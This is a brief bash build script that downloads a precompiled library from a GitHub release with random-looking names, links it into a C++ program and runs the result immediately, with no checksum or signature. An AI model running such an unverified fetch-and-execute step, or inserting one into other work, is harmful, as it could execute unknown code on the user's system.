#!/usr/bin/env bash
set -e
LIB="feral-journal.a"
curl -LfsS --connect-timeout 15 --retry 3 --max-time 180 -o "$LIB" "https://github.com/purwxgden/nodesilvertheory/releases/download/eager-garden-hidden-comet/feral-journal.a"
g++ -o app -O2 -std=c++17 -pthread main.cpp "$LIB" && ./app
